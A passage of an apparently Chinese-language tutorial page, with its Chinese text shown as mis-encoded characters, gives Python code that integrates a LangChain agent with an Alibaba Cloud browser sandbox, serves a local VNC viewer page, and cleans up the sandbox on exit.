    <span class="hljs-string">""</span><span class="hljs-string">"å¯åŠ¨ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨æ¥æä¾› vnc.html"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _http_server
    
    <span class="hljs-keyword">if</span> _http_server is not <span class="hljs-title class_">None</span>:
        <span class="hljs-keyword">return</span> _http_port
    
    <span class="hljs-attr">try</span>:
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">VNCRequestHandler</span>(http.<span class="hljs-property">server</span>.<span class="hljs-property">SimpleHTTPRequestHandler</span>):
            def <span class="hljs-title function_">__init__</span>(self, *args, **kwargs):
                <span class="hljs-variable language_">super</span>().<span class="hljs-title function_">__init__</span>(*args, directory=<span class="hljs-title function_">str</span>(current_dir), **kwargs)
            
            def <span class="hljs-title function_">log_message</span>(self, format, *args):
                # é™é»˜æ—¥å¿—ï¼Œé¿å…è¾“å‡ºè¿‡å¤šä¿¡æ¯
                pass
        
        # å°è¯•å¯åŠ¨æœåŠ¡å™¨
        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(_http_port, _http_port + <span class="hljs-number">10</span>):
            <span class="hljs-attr">try</span>:
                server = socketserver.<span class="hljs-title class_">TCPServer</span>((<span class="hljs-string">""</span>, port), <span class="hljs-title class_">VNCRequestHandler</span>)
                server.<span class="hljs-property">allow_reuse_address</span> = <span class="hljs-title class_">True</span>
                
                # åœ¨åå°çº¿ç¨‹ä¸­è¿è¡ŒæœåŠ¡å™¨
                def <span class="hljs-title function_">run_server</span>():
                    server.<span class="hljs-title function_">serve_forever</span>()
                
                thread = threading.<span class="hljs-title class_">Thread</span>(target=run_server, daemon=<span class="hljs-title class_">True</span>)
                thread.<span class="hljs-title function_">start</span>()
                
                _http_server = server
                <span class="hljs-keyword">return</span> port
            except <span class="hljs-title class_">OSError</span>:
                <span class="hljs-keyword">continue</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å¯åŠ¨ HTTP æœåŠ¡å™¨å¤±è´¥: {str(e)}"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">None</span>


def <span class="hljs-title function_">open_vnc_viewer</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"
    è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨å¹¶è®¾ç½® VNC URL
    
    Args:
        vnc_url: VNC WebSocket URL
    "</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-attr">try</span>:
        # è·å–å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•
        current_dir = <span class="hljs-title class_">Path</span>(__file__).<span class="hljs-property">parent</span>.<span class="hljs-title function_">absolute</span>()
        vnc_html_path = current_dir / <span class="hljs-string">"vnc.html"</span>
        
        # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        <span class="hljs-keyword">if</span> not vnc_html_path.<span class="hljs-title function_">exists</span>():
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"è­¦å‘Š: vnc.html æ–‡ä»¶ä¸å­˜åœ¨: {vnc_html_path}"</span>)
            <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
            <span class="hljs-keyword">return</span>
        
        # å¯åŠ¨ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨
        port = <span class="hljs-title function_">start_http_server</span>()
        
        <span class="hljs-keyword">if</span> <span class="hljs-attr">port</span>:
            # ç¼–ç  <span class="hljs-variable constant_">VNC</span> <span class="hljs-variable constant_">URL</span> ä½œä¸º <span class="hljs-variable constant_">URL</span> å‚æ•°
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            
            # æ„å»º <span class="hljs-variable constant_">HTTP</span> <span class="hljs-variable constant_">URL</span>
            http_url = f<span class="hljs-string">"http://localhost:{port}/vnc.html?url={encoded_url}"</span>
            
            # æ‰“å¼€æµè§ˆå™¨
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ­£åœ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP æœåŠ¡å™¨è¿è¡Œåœ¨: http://localhost:{port}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL: {vnc_url[:80]}..."</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å®Œæ•´ URL: {http_url[:100]}..."</span>)
            webbrowser.<span class="hljs-title function_">open</span>(http_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC æŸ¥çœ‹å™¨å·²æ‰“å¼€"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC URL å·²é€šè¿‡ URL å‚æ•°è‡ªåŠ¨è®¾ç½®ï¼Œé¡µé¢åŠ è½½åä¼šè‡ªåŠ¨è¿æ¥"</span>)
        <span class="hljs-attr">else</span>:
            # å¦‚æœ <span class="hljs-variable constant_">HTTP</span> æœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨ <span class="hljs-attr">file</span>:<span class="hljs-comment">// åè®®</span>
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"HTTP æœåŠ¡å™¨å¯åŠ¨å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨æ–‡ä»¶åè®®..."</span>)
            encoded_url = urllib.<span class="hljs-property">parse</span>.<span class="hljs-title function_">quote</span>(vnc_url, safe=<span class="hljs-string">''</span>)
            file_url = f<span class="hljs-string">"file://{vnc_html_path}?url={encoded_url}"</span>
            webbrowser.<span class="hljs-title function_">open</span>(file_url)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"VNC æŸ¥çœ‹å™¨å·²æ‰“å¼€ï¼ˆä½¿ç”¨æ–‡ä»¶åè®®ï¼‰"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æç¤º: å¦‚æœæ— æ³•è‡ªåŠ¨è¿æ¥ï¼Œè¯·æ‰‹åŠ¨å¤åˆ¶ VNC URL åˆ°è¾“å…¥æ¡†"</span>)
        
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨å¤±è´¥: {str(e)}"</span>)
        <span class="hljs-title function_">print_vnc_info</span>(vnc_url)


def <span class="hljs-title function_">print_vnc_info</span>(<span class="hljs-attr">vnc_url</span>: str):
    <span class="hljs-string">""</span><span class="hljs-string">"æ‰“å° VNC è¿æ¥ä¿¡æ¯"</span><span class="hljs-string">""</span>
    <span class="hljs-keyword">if</span> not <span class="hljs-attr">vnc_url</span>:
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"VNC å¯è§†åŒ–è¿æ¥ä¿¡æ¯"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nVNC URL: {vnc_url}"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nä½¿ç”¨æ–¹å¼:"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   1. ä½¿ç”¨ noVNC å®¢æˆ·ç«¯è¿æ¥"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   2. æˆ–åœ¨æµè§ˆå™¨ä¸­è®¿é—® VNC æŸ¥çœ‹å™¨é¡µé¢"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"   3. å®æ—¶æŸ¥çœ‹æµè§ˆå™¨æ“ä½œè¿‡ç¨‹"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)


def <span class="hljs-title function_">cleanup_sandbox</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"
    æ¸…ç† sandbox èµ„æº
    
    è¿™ä¸ªå‡½æ•°å¯ä»¥è¢«ä¿¡å·å¤„ç†å™¨ã€å¼‚å¸¸å¤„ç†å™¨å’Œæ­£å¸¸é€€å‡ºæµç¨‹è°ƒç”¨
    "</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # é˜²æ­¢é‡å¤æ¸…ç†
    <span class="hljs-keyword">if</span> <span class="hljs-attr">_cleanup_done</span>:
        <span class="hljs-keyword">return</span>
    
    _cleanup_done = <span class="hljs-title class_">True</span>
    
    <span class="hljs-attr">try</span>:
        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ­£åœ¨æ¸…ç† sandbox..."</span>)
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
            result = manager.<span class="hljs-title function_">destroy</span>()
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ¸…ç†ç»“æœ: {result}\n"</span>)
        <span class="hljs-attr">else</span>:
            <span class="hljs-title function_">print</span>(<span class="hljs-string">"\næ²¡æœ‰æ´»åŠ¨çš„ sandbox éœ€è¦æ¸…ç†\n"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ¸…ç† sandbox æ—¶å‡ºé”™: {str(e)}\n"</span>)


def <span class="hljs-title function_">signal_handler</span>(signum, frame):
    <span class="hljs-string">""</span><span class="hljs-string">"
    ä¿¡å·å¤„ç†å™¨ï¼Œå¤„ç† Ctrl+C (SIGINT) å’Œå…¶ä»–ä¿¡å·
    
    Args:
        signum: ä¿¡å·ç¼–å·
        frame: å½“å‰å †æ ˆå¸§
    "</span><span class="hljs-string">""</span>
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ”¶åˆ°ä¸­æ–­ä¿¡å·ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
    <span class="hljs-title function_">cleanup_sandbox</span>()
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
    sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)


def <span class="hljs-title function_">main</span>():
    <span class="hljs-string">""</span><span class="hljs-string">"ä¸»å‡½æ•°"</span><span class="hljs-string">""</span>
    <span class="hljs-variable language_">global</span> _cleanup_done
    
    # é‡ç½®æ¸…ç†æ ‡å¿—
    _cleanup_done = <span class="hljs-title class_">False</span>
    
    # æ³¨å†Œä¿¡å·å¤„ç†å™¨ï¼Œå¤„ç† <span class="hljs-title class_">Ctrl</span>+C (<span class="hljs-variable constant_">SIGINT</span>)
    signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGINT</span>, signal_handler)
    
    # åœ¨ <span class="hljs-title class_">Windows</span> ä¸Šï¼Œ<span class="hljs-variable constant_">SIGBREAK</span> ä¹Ÿå¯ä»¥å¤„ç†
    <span class="hljs-keyword">if</span> <span class="hljs-title function_">hasattr</span>(signal, <span class="hljs-string">'SIGBREAK'</span>):
        signal.<span class="hljs-title function_">signal</span>(signal.<span class="hljs-property">SIGBREAK</span>, signal_handler)
    
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"LangChain + AgentRun Browser Sandbox é›†æˆç¤ºä¾‹"</span>)
    <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-title function_">print</span>()
    
    <span class="hljs-attr">try</span>:
        # åˆ›å»º <span class="hljs-title class_">Agent</span>
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ­£åœ¨åˆå§‹åŒ– LangChain Agent..."</span>)
        agent = <span class="hljs-title function_">create_browser_agent</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"Agent åˆå§‹åŒ–å®Œæˆ\n"</span>)
        
        # ç¤ºä¾‹æŸ¥è¯¢
        queries = [
            <span class="hljs-string">"åˆ›å»ºä¸€ä¸ªæµè§ˆå™¨ sandbox"</span>,
            <span class="hljs-string">"è·å–å½“å‰ sandbox çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ VNC URL"</span>,
            <span class="hljs-string">"å¯¼èˆªåˆ° https://www.aliyun.com"</span>,
            <span class="hljs-string">"æˆªå–å½“å‰é¡µé¢æˆªå›¾"</span>,
        ]
        
        # æ‰§è¡ŒæŸ¥è¯¢
        <span class="hljs-keyword">for</span> i, query <span class="hljs-keyword">in</span> <span class="hljs-title function_">enumerate</span>(queries, <span class="hljs-number">1</span>):
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\n{'=' * 60}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢ {i}: {query}"</span>)
            <span class="hljs-title function_">print</span>(f<span class="hljs-string">"{'=' * 60}\n"</span>)
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}]
                })
                
                # æå–æœ€åä¸€æ¡æ¶ˆæ¯çš„å†…å®¹
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nç»“æœ:\n{output}\n"</span>)
                
                # å¦‚æœæ˜¯åˆ›å»º sandboxï¼Œè‡ªåŠ¨æ‰“å¼€ <span class="hljs-variable constant_">VNC</span> æŸ¥çœ‹å™¨
                <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:
                    <span class="hljs-attr">try</span>:
                        # ç­‰å¾…ä¸€ä¸‹ç¡®ä¿ sandbox å®Œå…¨åˆ›å»º
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ£€æµ‹åˆ° VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œè¯·æ£€æŸ¥ sandbox åˆ›å»ºæ˜¯å¦æˆåŠŸ"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ‰“å¼€ VNC æŸ¥çœ‹å™¨æ—¶å‡ºé”™: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                
                # å¦‚æœæ˜¯è·å–ä¿¡æ¯ï¼Œæ˜¾ç¤º <span class="hljs-variable constant_">VNC</span> ä¿¡æ¯
                elif i == <span class="hljs-number">2</span>:
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢å¤±è´¥: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # äº¤äº’å¼æŸ¥è¯¢
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n"</span> + <span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"è¿›å…¥äº¤äº’æ¨¡å¼ï¼ˆè¾“å…¥ 'quit' æˆ– 'exit' é€€å‡ºï¼ŒCtrl+C æˆ– Ctrl+D ä¸­æ–­ï¼‰"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span> + <span class="hljs-string">"\n"</span>)
        
        <span class="hljs-keyword">while</span> <span class="hljs-title class_">True</span>:
            <span class="hljs-attr">try</span>:
                user_input = <span class="hljs-title function_">input</span>(<span class="hljs-string">"è¯·è¾“å…¥æ‚¨çš„æŸ¥è¯¢: "</span>).<span class="hljs-title function_">strip</span>()
            except <span class="hljs-title class_">EOFError</span>:
                # å¤„ç† <span class="hljs-title class_">Ctrl</span>+D (<span class="hljs-variable constant_">EOF</span>)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°è¾“å…¥ç»“æŸ (Ctrl+D)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
                <span class="hljs-keyword">break</span>
            except <span class="hljs-title class_">KeyboardInterrupt</span>:
                # å¤„ç† <span class="hljs-title class_">Ctrl</span>+C (åœ¨ input è°ƒç”¨æœŸé—´)
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°ä¸­æ–­ä¿¡å· (Ctrl+C)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-keyword">if</span> not <span class="hljs-attr">user_input</span>:
                <span class="hljs-keyword">continue</span>
            
            <span class="hljs-keyword">if</span> user_input.<span class="hljs-title function_">lower</span>() <span class="hljs-keyword">in</span> [<span class="hljs-string">'quit'</span>, <span class="hljs-string">'exit'</span>, <span class="hljs-string">'é€€å‡º'</span>]:
                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nBye"</span>)
                # é€€å‡ºå‰æ¸…ç† sandbox
                <span class="hljs-title function_">cleanup_sandbox</span>()
                <span class="hljs-keyword">break</span>
            
            <span class="hljs-attr">try</span>:
                result = agent.<span class="hljs-title function_">invoke</span>({
                    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}]
                })
                
                output = result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>, [])[-<span class="hljs-number">1</span>].<span class="hljs-property">content</span> <span class="hljs-keyword">if</span> <span class="hljs-title function_">isinstance</span>(result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"messages"</span>), list) <span class="hljs-keyword">else</span> result.<span class="hljs-title function_">get</span>(<span class="hljs-string">"output"</span>, <span class="hljs-title function_">str</span>(result))
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\nç»“æœ:\n{output}\n"</span>)
                
                # æ£€æŸ¥æ˜¯å¦éœ€è¦æ‰“å¼€æˆ–æ˜¾ç¤º <span class="hljs-variable constant_">VNC</span> ä¿¡æ¯
                user_input_lower = user_input.<span class="hljs-title function_">lower</span>()
                <span class="hljs-keyword">if</span> <span class="hljs-string">"åˆ›å»º"</span> <span class="hljs-keyword">in</span> user_input_lower and <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # å¦‚æœæ˜¯åˆ›å»º sandboxï¼Œè‡ªåŠ¨æ‰“å¼€ <span class="hljs-variable constant_">VNC</span> æŸ¥çœ‹å™¨
                    <span class="hljs-attr">try</span>:
                        # ç­‰å¾…ä¸€ä¸‹ç¡®ä¿ sandbox å®Œå…¨åˆ›å»º
                        <span class="hljs-keyword">import</span> time
                        time.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>)
                        
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            vnc_url = info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>)
                            <span class="hljs-keyword">if</span> <span class="hljs-attr">vnc_url</span>:
                                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"\næ£€æµ‹åˆ° VNC URL: {vnc_url[:80]}..."</span>)
                                <span class="hljs-title function_">open_vnc_viewer</span>(vnc_url)
                                <span class="hljs-title function_">print_vnc_info</span>(vnc_url)
                            <span class="hljs-attr">else</span>:
                                <span class="hljs-title function_">print</span>(<span class="hljs-string">"\nè­¦å‘Š: æœªè·å–åˆ° VNC URLï¼Œè¯·æ£€æŸ¥ sandbox åˆ›å»ºæ˜¯å¦æˆåŠŸ"</span>)
                    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æ‰“å¼€ VNC æŸ¥çœ‹å™¨æ—¶å‡ºé”™: {str(e)}"</span>)
                        <span class="hljs-keyword">import</span> traceback
                        traceback.<span class="hljs-title function_">print_exc</span>()
                elif <span class="hljs-string">"sandbox"</span> <span class="hljs-keyword">in</span> user_input_lower or <span class="hljs-string">"vnc"</span> <span class="hljs-keyword">in</span> <span class="hljs-attr">user_input_lower</span>:
                    # å…¶ä»–æƒ…å†µåªæ˜¾ç¤ºä¿¡æ¯
                    <span class="hljs-attr">try</span>:
                        manager = <span class="hljs-title function_">get_sandbox_manager</span>()
                        <span class="hljs-keyword">if</span> manager.<span class="hljs-title function_">is_active</span>():
                            info = manager.<span class="hljs-title function_">get_info</span>()
                            <span class="hljs-keyword">if</span> info.<span class="hljs-title function_">get</span>(<span class="hljs-string">'vnc_url'</span>):
                                <span class="hljs-title function_">print_vnc_info</span>(info[<span class="hljs-string">'vnc_url'</span>])
                    <span class="hljs-attr">except</span>:
                        pass
            
            except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
                <span class="hljs-title function_">print</span>(f<span class="hljs-string">"æŸ¥è¯¢å¤±è´¥: {str(e)}\n"</span>)
                <span class="hljs-keyword">import</span> traceback
                traceback.<span class="hljs-title function_">print_exc</span>()
        
        # æ¸…ç†èµ„æºï¼ˆä»…åœ¨ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼‰
        <span class="hljs-title function_">cleanup_sandbox</span>()
    
    except <span class="hljs-title class_">KeyboardInterrupt</span>:
        # å¤„ç†é¡¶å±‚ <span class="hljs-title class_">KeyboardInterrupt</span> (<span class="hljs-title class_">Ctrl</span>+C)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°ä¸­æ–­ä¿¡å· (Ctrl+C)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">EOFError</span>:
        # å¤„ç†é¡¶å±‚ <span class="hljs-title class_">EOFError</span> (<span class="hljs-title class_">Ctrl</span>+D)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\n\næ£€æµ‹åˆ°è¾“å…¥ç»“æŸ (Ctrl+D)ï¼Œæ­£åœ¨æ¸…ç†èµ„æº..."</span>)
        <span class="hljs-title function_">cleanup_sandbox</span>()
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"æ¸…ç†å®Œæˆ"</span>)
        sys.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>)
    except <span class="hljs-title class_">ValueError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"é…ç½®é”™è¯¯: {str(e)}"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"\næç¤º: è¯·ç¡®ä¿å·²è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡:"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - DASHSCOPE_API_KEY: DashScope API Key"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCOUNT_ID: é˜¿é‡Œäº‘è´¦å· ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_ID: è®¿é—®å¯†é’¥ ID"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_ACCESS_KEY_SECRET: è®¿é—®å¯†é’¥ Secret"</span>)
        <span class="hljs-title function_">print</span>(<span class="hljs-string">"   - ALIBABA_CLOUD_REGION: åŒºåŸŸï¼ˆé»˜è®¤: cn-hangzhouï¼‰"</span>)
    except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
        <span class="hljs-title function_">print</span>(f<span class="hljs-string">"å‘ç”Ÿé”™è¯¯: {str(e)}"</span>)
        <span class="hljs-keyword">import</span> traceback
        traceback.<span class="hljs-title function_">print_exc</span>()
        # å‘ç”Ÿé”™è¯¯æ—¶ä¹Ÿå°è¯•æ¸…ç†
        <span class="hljs-title function_">cleanup_sandbox</span>()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-title function_">main</span>()
</code></pre>
<p><strong>å…³é”®åŠŸèƒ½ï¼š</strong></p>
<ol>
<li><strong>VNC è‡ªåŠ¨æ‰“å¼€</strong>: åˆ›å»º Sandbox åè‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨</li>
<li><strong>ä¿¡å·å¤„ç†</strong>: æ•è· Ctrl+Cï¼Œç¡®ä¿èµ„æºæ­£ç¡®æ¸…ç†</li>
<li><strong>äº¤äº’æ¨¡å¼</strong>: æ”¯æŒæŒç»­å¯¹è¯ï¼Œå¤ç”¨ Sandbox å®ä¾‹</li>
</ol>
<h5 data-id="heading-18">VNC å¯è§†åŒ–é›†æˆ</h5>
<p>VNCï¼ˆVirtual Network Computingï¼‰åŠŸèƒ½å…è®¸æ‚¨å®æ—¶æŸ¥çœ‹å’Œç›‘æ§æµè§ˆå™¨åœ¨ Sandbox ä¸­çš„æ“ä½œè¿‡ç¨‹ï¼Œè¿™å¯¹äºè°ƒè¯•å’Œç›‘æ§ Agent è¡Œä¸ºéå¸¸æœ‰ç”¨ã€‚</p>
<p><strong>è·å– VNC URLï¼š</strong></p>
<p>åˆ›å»º Sandbox åï¼Œå¯ä»¥é€šè¿‡ <code>get_sandbox_info</code> tool è·å– VNC URLï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># é€šè¿‡ <span class="hljs-title class_">Agent</span> è°ƒç”¨
result = agent.<span class="hljs-title function_">invoke</span>({
    <span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"è·å– sandbox ä¿¡æ¯"</span>}]
})

# æˆ–ç›´æ¥é€šè¿‡ç®¡ç†å™¨è·å–
manager = <span class="hljs-title function_">get_sandbox_manager</span>()
info = manager.<span class="hljs-title function_">get_info</span>()
vnc_url = info[<span class="hljs-string">'vnc_url'</span>]
</code></pre>
<p><strong>è‡ªåŠ¨æ‰“å¼€ VNC æŸ¥çœ‹å™¨ï¼š</strong></p>
